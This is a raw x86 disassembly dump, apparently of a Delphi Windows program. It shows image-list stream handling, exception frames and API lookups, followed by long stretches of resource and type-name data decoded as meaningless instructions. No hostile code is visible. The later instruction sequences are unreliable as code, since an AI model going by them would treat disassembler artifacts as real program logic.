mov eax [ ebp - 0x18 ]
add eax esi
cdq
push edx
push eax
mov eax ebx
call sub_416680
mov dl 0x1
mov eax [ r-xdata ]
call sub_422f14
mov [ ebp - 0x10 ] eax
xor eax eax
push ebp
push sub_44b913
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx ebx
mov eax [ ebp - 0x10 ]
mov ecx [ eax ]
call [ ecx + 0x54 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_422f14
mov [ ebp - 0xc ] eax
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x34 ]
mov eax [ ebp - 0xc ]
mov ecx [ eax ]
call [ ecx + 0x40 ]
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x30 ]
mov eax [ ebp - 0xc ]
mov ecx [ eax ]
call [ ecx + 0x34 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_422f14
mov [ ebp - 0x14 ] eax
mov dl 0x1
mov eax [ ebp - 0x14 ]
call sub_4242ac
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x34 ]
mov eax [ ebp - 0x14 ]
mov ecx [ eax ]
call [ ecx + 0x40 ]
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x30 ]
mov eax [ ebp - 0x14 ]
mov ecx [ eax ]
call [ ecx + 0x34 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
push eax
lea eax [ ebp - 0x30 ]
push eax
mov eax [ ebp - 0x4 ]
mov ecx [ eax + 0x34 ]
xor edx edx
xor eax eax
call sub_412cd4
mov eax [ ebp - 0x4 ]
call sub_44bcd8
xor eax eax
push ebp
push sub_44b8f6
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x8 ]
mov edx [ eax ]
call [ edx + 0x20 ]
mov edx [ ebp - 0x4 ]
mov ecx [ edx + 0x30 ]
cdq
idiv ecx
dec eax
test eax eax
jl r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_44b8fd
mov eax [ ebp - 0xc ]
call sub_403124
mov eax [ ebp - 0x14 ]
call sub_403124
mov eax [ ebp - 0x4 ]
call sub_44bcdc
retn
inc eax
mov [ ebp - 0x20 ] eax
xor edi edi
mov eax [ ebp - 0x8 ]
mov edx [ eax ]
call [ edx + 0x2c ]
mov edx [ ebp - 0x4 ]
mov ecx [ edx + 0x34 ]
cdq
idiv ecx
mov esi eax
dec esi
test esi esi
jl r-xdata
inc edi
dec [ ebp - 0x20 ]
jne r-xdata
inc esi
xor ebx ebx
cmp [ ebp - 0x1c ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
push eax
lea eax [ ebp - 0x40 ]
push eax
mov eax [ ebp - 0x4 ]
mov ecx [ eax + 0x34 ]
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x30 ]
imul edx edi
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x34 ]
imul eax ebx
call sub_412cfc
lea eax [ ebp - 0x40 ]
push eax
mov eax [ ebp - 0x8 ]
call sub_4234dc
push eax
mov eax [ ebp - 0xc ]
call sub_4234dc
lea edx [ ebp - 0x30 ]
pop ecx
call sub_41e8bc
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
push eax
lea eax [ ebp - 0x40 ]
push eax
mov eax [ ebp - 0x4 ]
mov ecx [ eax + 0x34 ]
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x30 ]
imul edx edi
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x34 ]
imul eax ebx
call sub_412cfc
lea eax [ ebp - 0x40 ]
push eax
mov eax [ ebp - 0x10 ]
call sub_4234dc
push eax
mov eax [ ebp - 0x14 ]
call sub_4234dc
lea edx [ ebp - 0x30 ]
pop ecx
call sub_41e8bc
mov ecx [ ebp - 0x14 ]
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x4 ]
call sub_44a8d4
dec [ ebp - 0x1c ]
inc ebx
dec esi
jne r-xdata
cmp [ ebp - 0x1c ] 0x0
je r-xdata
sub_44b940
push ebp
mov ebp esp
add esp 0xffffffec
push ebx
push esi
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
push 0x0
mov ecx [ ebp - 0x8 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_41b574
mov [ ebp - 0xc ] eax
xor eax eax
push ebp
push sub_44b9a0
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0xc ]
test eax eax
je r-xdata
push eax
call ImageList_Read
mov edx eax
mov eax [ ebp - 0x4 ]
call sub_44a75c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_44b9a7
mov eax [ ebp - 0xc ]
call sub_403124
retn
sub eax 0xffffffec
sub_44b9a7
mov eax [ ebp - 0x4 ]
call sub_44a5c4
test al al
jne r-xdata
pop esi
pop ebx
mov esp ebp
pop ebp
retn
xor ebx ebx
mov dl 0x1
mov eax [ r-xdata ]
call sub_4030f4
mov [ ebp - 0x10 ] eax
xor eax eax
push ebp
push sub_44bad6
push [ fs : eax ]
mov [ fs : eax ] esp
push 0x0
push 0x0
mov eax [ ebp - 0x8 ]
call sub_416680
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x10 ]
call sub_416d88
push 0x0
push 0x12
mov eax [ ebp - 0x10 ]
call sub_416680
lea edx [ ebp - 0x11 ]
mov ecx 0x1
mov eax [ ebp - 0x10 ]
mov esi [ eax ]
call [ esi + 0xc ]
dec eax
jne r-xdata
test bl bl
je r-xdata
cmp [ ebp - 0x11 ] 0x1
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x10 ]
call sub_403124
retn
push 0x0
push 0x0
mov eax [ ebp - 0x10 ]
call sub_416680
push 0x0
mov ecx [ ebp - 0x10 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_41b574
mov [ ebp - 0xc ] eax
xor eax eax
push ebp
push sub_44bab9
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0xc ]
test eax eax
je r-xdata
push 0x0
push 0x38
mov eax [ ebp - 0x10 ]
call sub_416680
lea edx [ ebp - 0x12 ]
mov ecx 0x1
mov eax [ ebp - 0x10 ]
mov esi [ eax ]
call [ esi + 0xc ]
dec eax
jne r-xdata
push eax
call ImageList_Read
mov edx eax
mov eax [ ebp - 0x4 ]
call sub_44a75c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0xc ]
call sub_403124
retn
sub eax 0xffffffec
mov al [ ebp - 0x12 ]
or [ ebp - 0x11 ] al
push 0x0
push 0x12
mov eax [ ebp - 0x10 ]
call sub_416680
lea edx [ ebp - 0x11 ]
mov ecx 0x1
mov eax [ ebp - 0x10 ]
mov ebx [ eax ]
call [ ebx + 0x10 ]
dec eax
sete bl
sub_44bb08
push ebx
push esi
push edi
add esp 0xfffffff0
mov edi edx
mov esi eax
mov eax esi
call sub_44a7fc
mov eax edi
call sub_416660
mov [ esp + 0xc ] eax
mov edx esp
mov ecx 0x4
mov eax edi
mov ebx [ eax ]
call [ ebx + 0xc ]
lea edx [ esp + 0x4 ]
mov ecx 0x4
mov eax edi
mov ebx [ eax ]
call [ ebx + 0xc ]
mov bl [ esp ]
and bl 0xff
mov ax [ esp ]
shr ax 0x8
mov [ esp + 0x8 ] al
mov eax [ esp + 0xc ]
cdq
push edx
push eax
mov eax edi
call sub_416680
mov eax [ esp ]
cmp eax [ esp + 0x4 ]
je r-xdata
mov edx edi
mov eax esi
call sub_44b6ac
cmp bl 0x49
jne r-xdata
cmp [ esp + 0x8 ] 0x4c
jne r-xdata
mov edx edi
mov eax esi
call sub_44b940
jmp r-xdata
add esp 0x10
pop edi
pop esi
pop ebx
retn
sub_44bb94
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov esi edx
mov ebx eax
cmp [ rw-data ] 0x0
jne r-xdata
push 0x0
mov ecx esi
mov dl 0x1
mov eax [ r-xdata ]
call sub_41b574
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_44bc8e
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ rw-data ] 0x0
je r-xdata
mov eax r-xdata
call sub_40beb8
mov [ rw-data ] eax
cmp [ rw-data ] 0x60000
jb r-xdata
mov eax [ ebp - 0x4 ]
test eax eax
je r-xdata
mov eax [ ebp - 0x4 ]
test eax eax
je r-xdata
push r-xdata
call GetModuleHandleA
mov edi eax
test edi edi
je r-xdata
push eax
mov eax ebx
call sub_44a798
push eax
call ImageList_Write
test eax eax
jne r-xdata
sub eax 0xffffffec
push eax
push 0x1
mov eax ebx
call sub_44a798
push eax
call [ rw-data ]
test eax eax
je r-xdata
sub eax 0xffffffec
push r-xdata
push edi
call GetProcAddress
mov [ rw-data ] eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_44bc95
mov eax [ ebp - 0x4 ]
call sub_403124
retn
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b724
call sub_4038b0
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b724
call sub_4038b0
jmp r-xdata
sub_44bcfc
push ebx
push esi
call sub_4034b0
mov ebx edx
mov esi eax
mov eax [ esi + 0x4 ]
test eax eax
je r-xdata
mov edx ebx
and dl 0xfc
mov eax esi
call sub_403114
test bl bl
jle r-xdata
mov edx esi
call sub_44b46c
pop esi
pop ebx
retn
mov eax esi
call sub_403498
sub_44bd48
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_44bd6d
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_44bd74
retn
sub_44bd84
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
int3
sub_44c1d0
inc esp
add [ edi + esi * 8 + 0x44 ] dh
add [ edi + esi * 8 - 0x3ebffbc ] ch
inc esp
add [ eax ] al
cld
inc esp
add [ eax ] al
cmc
inc esp
add [ ecx ] cl
push esp
dec ebp
outsb
jne r-xdata
test al 0x0
add bh bh
test al 0x0
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
add eax [ eax ]
or [ ecx + 0x75 ] eax
je r-xdata
je r-xdata
push es
add [ esi ] al
inc edx
imul esi [ ebp + ebp * 2 + 0x61 ] 0x44bdd870
add [ eax ] cl
add bh bh
add al 0xf5
inc esp
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
pop es
add [ 0x61657242 ] al
inc ebx
push 0xc46b6365
mov edi 0x3b0044
add bh bh
xor al 0x7
inc ebp
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ edx ] 0x0
add [ eax ] al
add al 0x0
or eax [ ecx + 0x75 ]
je r-xdata
arpl [ ebx - 0x3c ] bp
insd
hlt
add [ eax ] al
imul ebp [ edi + 0x6e ] r-xdata
cmp [ eax ] al
add bh bh
test ch dh
inc esp
add [ eax ] cl
inc [ eax + eax ]
inc edx
jb r-xdata
dec eax
outsd
je r-xdata
add [ eax ] al
dec ebp
outsb
jne r-xdata
imul ebp [ eax + edx + 0x300040 ] 0x0
call [ esi * 8 - 0x217ffbc ]
popad
jns r-xdata
adc [ eax ] al
cmp eax 0x78ff0000
cld
inc esp
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
adc [ eax ] eax
or [ edx + 0x61 ] edx
imul ebp [ fs : edi + 0x49 ] 0x706d6574
adc eax 0x600041
dec ecx
outsb
js r-xdata
add [ eax ] al
or eax 0x72470a00
outsd
jne r-xdata
insb
adc [ eax ] al
aas
add [ eax ] al
call [ eax - 0xa ]
inc esp
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
insd
popad
jae r-xdata
inc esp
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x43070008 ] al
popad
jo r-xdata
add bh bh
adc al 0xf5
inc esp
add al ch
std
les edi [ edi + 0x3c0044 ]
add bh bh
mov al 0x8
inc ebp
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ edx ] 0x0
add [ eax ] al
add eax 0x75411100
je r-xdata
jo r-xdata
inc esp
add [ eax + 0x44fe ] ch
insb
jo r-xdata
adc eax 0x540041
add bh bh
push esp
add [ eax ] al
[ eax - 0x2 ]
adc [ eax ] al
cmp al [ eax ]
add bh bh
int3
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
or [ eax ] eax
pop es
inc ebx
push 0x656b6365
xchg esp eax
mov [ 0x7c0044 ] eax
add bh bh
aam 0xff
inc esp
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x530d000a ] al
jne r-xdata
outsb
add [ eax ] dl
inc eax
add [ eax ] bh
add [ eax ] al
inc [ ebp + esi * 8 - 0x1f7ffbc ]
inc esp
add [ eax ] al
dec esp
imul ebp [ esi + 0x65 ] 0x75646552
arpl [ ecx + ebp * 2 + 0x6f ] si
outsb
cwde
iretd
add [ edx ] dl
add [ eax ] cl
push ebx
push 0x4374726f
add bh bh
loopne r-xdata
inc ecx
add [ eax ] ah
cwde
add [ eax ] al
jne r-xdata
inc ebx
dec ecx
outsb
js r-xdata
outsd
outsb
je r-xdata
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f120016 ] al
outsb
inc ecx
jbe r-xdata
add [ eax ] dl
inc eax
add [ esi ] bh
add [ eax ] al
push esp
test [ eax + eax - 0x38 ] 0xfe
inc esp
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
adc eax [ eax ]
pop es
push esi
imul esi [ ebx + 0x69 ] 0x88656c62
adc eax 0x880041
add bh bh
mov [ eax ] al
add bh bh
call sub_4509a0
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f070014 ] al
outsb
inc ebx
insb
inc ecx
add ah ch
outsb
arpl [ ebp + 0x64 ] sp
inc esp
jb r-xdata
outsd
dec ecx
je r-xdata
js r-xdata
mov cl 0x41
add [ eax + 0x33 ] bh
inc eax
add [ eax - 0x55 ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
ja r-xdata
in al 0xae
inc ecx
add [ edx + esi * 4 ] cl
inc ecx
add [ eax ] bl
or [ ebp ] eax
les edx [ ecx ]
inc ebp
add [ eax ] cl
or al [ ebp ]
hlt
inc ebp
add ah bl
inc ecx
add [ eax + 0x74004033 ] al
xor eax [ eax ]
mov esp 0xd8004030
xor [ eax ] al
mov ah 0x9
inc ebp
add [ eax ] al
dec eax
xor eax [ eax ]
inc eax
stosd [ edi ]
ja r-xdata
imul esp [ ebx + 0x6b ] r-xdata
nop
add [ eax ] al
call [ eax + 0x1ff0000 ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0a0015 ] al
outsb
inc esp
jb r-xdata
insd
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
adc al [ eax ]
or [ ebx + 0x68 ] dl
outsd
jb r-xdata
test al 0xfe
inc esp
add [ eax ] al
lodsb [ esi ]
adc [ eax ] al
pop eax
add [ eax ] al
[ eax ]
add bh bh
dec eax
inc [ eax + eax ]
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4804000f ] al
imul ebp [ esi + 0x74 ] r-xdata
inc eax
add [ eax ] al
inc [ edi + esi * 8 ]
inc esp
add [ eax + 0x44fe ] cl
add [ eax ] al
cmp bh 0xff
add [ 0x654d6e4f ] cl
popad
je r-xdata
add dl cl
lds eax [ eax + eax - 0x22 ]
lds eax [ eax + eax + 0x58 ]
add [ eax ] al
add ah dl
sub [ ecx ] eax
in al dx
je r-xdata
scasb [ edi ]
inc ecx
add ah ah
in al dx
jb r-xdata
mov eax 0xe80044c5
insd
fdivr [ esi + 0x980044 ]
add bh bh
xor eax [ eax ]
je r-xdata
jae r-xdata
insd
push esp
mov edi 0xa00044
add bh bh
mov al [ 0x1ff0000 ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0d0017 ] al
outsb
dec ebp
popad
dec ecx
je r-xdata
scasb [ edi ]
inc ecx
add ah dh
lodsd [ esi ]
inc ecx
add [ edi + eax * 2 ] bl
inc ecx
add ah bl
adc [ ebp ] eax
js r-xdata
inc eax
add [ eax + esi + 0x30d80040 ] bh
inc eax
add [ ecx + ecx + 0x48000045 ] dh
scasb [ edi ]
inc ecx
add ah dl
scasd [ edi ]
inc ecx
add [ edx + esi * 4 ] al
inc ecx
add ah ch
insd
lea eax [ eax ]
jl r-xdata
jbe r-xdata
lds eax [ eax + eax ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
inc esp
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax - 0x17ffbb3b ] bh
sub_44c733
fcom [ esi ]
inc ebp
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
add eax 0x75410900
je r-xdata
inc eax
add [ ecx ] al
add bh bh
xor al 0x16
dec ebp
jb r-xdata
je r-xdata
outsb
je r-xdata
popad
ja r-xdata
inc eax
adc al 0x41
add [ eax ] dh
add [ eax ] al
jmp [ eax ]
test al cl
inc esp
add [ 0x654c616d ] cl
je r-xdata
jb r-xdata
add [ eax ] al
add [ edx ] al
add [ eax ] al
add [ eax + ecx * 8 ] al
inc esp
add [ esi ] al
jo r-xdata
imul eax [ ecx + ebp * 2 + 0x4d ] 0x1865646f
mov esi 0x500044
add bh bh
push eax
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f08000a ] al
outsb
inc ebx
push 0x65676e61
nop
or al cl
inc esp
add [ ebx ] al
andps xmm2 [ eax + 0x6f ]
inc ebp
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
or [ eax ] eax
push cs
push eax
popad
jb r-xdata
adc [ eax ] al
inc ecx
add [ eax ] al
push [ esi + edx ]
enter 0x44 0x8d
inc eax
outsd
dec eax
enter 0x44 0x3
or al 0x54
push esp
jb r-xdata
dec ebp
outsb
jne r-xdata
push esp
dec ebp
outsb
dec esp
je r-xdata
jne r-xdata
mov al cl
inc esp
add [ ebx ] al
jo r-xdata
in al 0xae
inc ecx
add [ edx + esi * 4 ] cl
inc ecx
add [ eax - 0x3bffbae3 ] bl
adc [ ebp ] eax
or [ edx ] cl
inc ebp
add ah dh
adc [ ebp ] eax
inc eax
push ds
inc ebp
add al bh
push ds
inc ebp
add [ edx ] cl
push esp
push eax
outsd
jo r-xdata
inc ebp
add ah bl
scasb [ edi ]
inc ecx
add ah dl
scasd [ edi ]
inc ecx
add [ edx + esi * 4 ] al
inc ecx
add ah ch
scasb [ edi ]
inc ecx
add ah ah
scasb [ edi ]
or eax 0x6f42616d
insd
push edx
imul esp [ edi + 0x68 ] 0x616d0d74
arpl [ ebx + 0x42 ] bp
jne r-xdata
push edx
imul esp [ edi + 0x68 ] 0x4c6f5474
je r-xdata
insd
popad
inc edx
outsd
outsb
or [ eax + 0x61 ] dh
jo r-xdata
je r-xdata
insb
imul esp [ edi + 0x6e ] 0x746e656d
add [ eax ] eax
add [ eax - 0x37ffbaea ] bh
push ss
inc ebp
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
jo r-xdata
xor [ eax ] al
or al 0x1e
add al bl
outsd
insd
push esp
outsd
push esp
outsd
jo r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0x780044c9 ] bl
add [ eax ] al
add [ eax ] dh
lds eax [ eax + eax - 0x14 ]
outsd
inc edx
outsd
je r-xdata
jo r-xdata
je r-xdata
add [ eax ] al
add [ eax + eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add al 0x0
imul ebp [ ebp + 0x61 ] 0x6e6f6974
jae r-xdata
inc ebx
outsb
push edx
imul esp [ edi + 0x68 ] 0x61700874
push esp
outsd
dec eax
insb
dec esp
imul ebp [ esi + 0x65 ] 0x75646552
arpl [ ecx + ebp * 2 + 0x6f ] si
outsb
add [ eax ] dl
inc eax
add [ ecx ] ah
add bh bh
popad
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
push es
add [ ecx ] cl
inc ecx
jne r-xdata
add [ eax - 0x57ffbaea ] bl
push ss
inc ebp
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
outsb
jne r-xdata
add eax 0x756e654d
jae r-xdata
insd
popad
dec esi
outsd
outsb
add eax 0x756e654d
inc ebp
add [ eax ] al
dec eax
inc ecx
add ah dh
lodsd [ esi ]
inc ecx
add [ edi + eax * 2 ] bl
inc ecx
add ah bl
adc [ ebp ] eax
js r-xdata
inc eax
add [ ebx + esi + 0x40 ] dh
add [ eax + esi + 0x30d80040 ] bh
inc eax
add [ esi + ebx ] cl
outsd
insd
popad
push esp
outsd
outsb
add [ eax ] eax
add [ eax ] al
add [ ecx ] al
add [ eax ] al
add [ eax + ecx * 8 + 0x44 ] al
add [ 0x69526274 ] cl
push 0x74754274
je r-xdata
outsb
or al 0x74
bound ecx [ ebp + 0x66 ]
je r-xdata
outsb
jne r-xdata
outsd
outsb
je r-xdata
imul eax [ eax ] 0x69ff00
outsd
push eax
outsd
jo r-xdata
jo r-xdata
pop es
add [ eax ] cl
inc edx
imul eax [ ecx + ebp * 2 + 0x4d ] 0x1c65646f
adc eax 0x1e540041
inc ebp
dec eax
outsd
je r-xdata
mov cl 0x41
add [ eax + 0x33 ] bh
inc eax
add [ eax - 0x55 ] al
in al dx
test al 0xc9
inc esp
add [ edi ] al
or dl [ eax + edx * 2 + 0x6f ]
jo r-xdata
outsd
je r-xdata
jne r-xdata
add [ eax ] al
add [ eax + eax ] cl
outsb
imul ebp [ ebp + 0x61 ] 0x6e6f6974
add [ eax ] dl
inc eax
add [ eax ] al
add bh bh
add [ ecx ] dl
inc ebp
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
or eax [ eax ]
or [ edi + 0x77 ] ecx
outsb
jb r-xdata
js r-xdata
or eax 0x72540b00
popad
arpl [ ebx + 0x42 ] bp
jne r-xdata
jb r-xdata
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
or al [ eax ]
or eax 0x756e654d
inc ecx
jo r-xdata
jns r-xdata
add [ eax ] al
add eax 0x75411100
je r-xdata
add [ eax ] al
jo r-xdata
jo r-xdata
andps xmm1 [ ebp + 0x65 ]
outsb
enter 0x44 0x3
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0x44c9 ] ch
je r-xdata
outsd
dec esp
add [ esi ] al
push cs
push esp
dec ebp
outsb
jne r-xdata
je r-xdata
add [ eax - 0x80000000 ] al
sldt [ edi ]
dec edi
outsb
push eax
outsd
jo r-xdata
outsb
push cs
push eax
popad
jb r-xdata
push [ esi + edx ]
inc ebp
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
or al 0x0
xchg esp eax
mov [ r--data ] eax
add bh bh
cmp al 0x12
inc ebp
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x49060009 ] al
inc ecx
add [ ebx + esi + 0x40 ] ch
add [ eax + 0x33 ] bh
inc eax
add [ ebx + esi + 0x40 ] bh
add [ eax + 0x74004033 ] al
xor eax [ eax ]
mov esp 0xd8004030
xor [ eax ] al
je r-xdata
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f08000e ] al
outsb
ja r-xdata
adc al 0x41
add [ eax ] dh
add [ eax ] al
jmp [ eax ]
add [ esi + ebx + 0x45 ] bl
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
or [ eax ] al
or ecx [ eax + 0x65 ]
insb
sbb al 0x15
inc ecx
add [ esi + ebx + 0x45 ] dl
or al 0xc0
inc esp
add [ eax ] al
add al 0x0
or eax [ ecx + 0x75 ]
je r-xdata
add [ eax ] al
outsb
jne r-xdata
inc ecx
add [ eax + 0x74004033 ] al
xor eax [ eax ]
mov esp 0xd8004030
xor eax [ eax ]
inc eax
stosd [ edi ]
add [ ecx + ecx * 8 + 0x44 ] dl
add [ eax ] al
add [ eax ] al
add [ eax ] al
outsb
imul ebp [ ebp + 0x61 ] 0x6e6f6974
add [ eax + ecx * 8 + 0x408d0044 ] eax
outsb
add eax 0x756e654d
jae r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
jo r-xdata
jo r-xdata
inc ebx
push 0x65676e61
mov [ 0x700041 ] dl
add bh bh
jo r-xdata
add [ eax ] al
or [ esi ] 0x0
or [ edi + 0x6e ] cl
imul eax [ ecx + ebp * 2 + 0x4d ] 0x4465646f
enter 0x44 0x68
add [ eax ] al
[ eax ]
insd
popad
jae r-xdata
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
or [ eax ] eax
push es
dec ecx
enter 0x44 0x69
add [ eax ] al
[ ecx ]
add [ ebx + ebx ] cl
outsb
sbb [ esi + 0x500044 ] bh
add bh bh
push eax
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
adc [ eax ] al
inc ecx
add [ eax ] al
leave
inc esp
add ah ah
lds eax [ eax + eax + 0x10 ]
add [ 0x756e654d ] al
jae r-xdata
inc ecx
add [ eax ] dl
sbb [ ebp ] al
or dl [ eax + edx * 2 + 0x6f ]
jo r-xdata
inc esp
add [ eax ] cl
add [ eax ] al
add [ eax ] ah
push esp
inc edx
add [ ebx + esi + 0x40 ] ch
add [ eax + 0x33 ] bh
inc eax
add [ ebx + esi + 0x40 ] bh
add [ eax + 0x74004033 ] al
xor eax [ eax ]
mov esp 0xd8004030
xor [ eax ] al
je r-xdata
sar al 0xcb
inc esp
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ esp + ecx * 8 ] cl
inc esp
add [ eax + eax ] dl
add [ eax ] al
or al 0x1b
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
add eax [ eax ]
or [ ecx + 0x6c ] eax
imul esp [ edi + 0x6e ] 0x746e656d
or al 0xc0
inc esp
add [ eax + ecx * 8 ] al
inc esp
add [ eax ] ah
add bh bh
pushad
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
add [ ecx ] dh
xor dh [ ebx ]
xor al 0x35
aaa
cmp [ ecx ] bh
xor [ ecx + 0x42 ] al
inc ebx
inc esp
inc ebp
inc esi
inc edi
dec eax
dec ecx
dec edx
dec ebx
dec esp
dec ebp
dec esi
dec edi
push eax
push ecx
push edx
push ebx
push esp
push ebp
push esi
push edi
pop eax
pop ecx
pop edx
add [ eax ] al
add [ eax ] al
jo r-xdata
test ebx ebx
je r-xdata
je r-xdata
pushad
push ebp
inc edx
add ah al
push ebp
inc edx
add [ ebp + edx * 2 + 0x55900042 ] ah
inc edx
add [ esi ] cl
push esp
dec ebp
outsb
jne r-xdata
imul esi [ ebx + 0x74 ] 0x44cc6490
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax - 0x34 ] dh
mov eax esi
pop edi
pop esi
pop ebx
push 0x0
mov edx edi
xor ecx ecx
mov eax ebx
call sub_44154c
mov esi eax
test esi esi
jne r-xdata
retn
insd
push ebx
je r-xdata
mov esi ebx
arpl [ ebx - 0x70 ] bp
sub_44ca69
push ss
inc ebp
add [ eax ] bl
cmovne eax [ eax ]
add [ eax ] al
add [ eax - 0x80000000 ] al
pop es
add [ eax ] cl
inc edx
imul eax [ ecx + ebp * 2 + 0x4d ] 0x1c65646f
adc eax 0x1e540041
inc ebp
add [ esi + ebx + 0x45 ] bl
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
or [ eax ] al
or ecx [ eax + 0x65 ]
insb
jo r-xdata
outsb
jne r-xdata
outsd
outsb
je r-xdata
add [ eax ] al
add [ eax + eax ] cl
outsb
imul ebp [ ebp + 0x61 ] 0x6e6f6974
add [ eax ] dl
inc eax
add [ eax ] al
add bh bh
add [ ecx ] dl
inc ebp
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
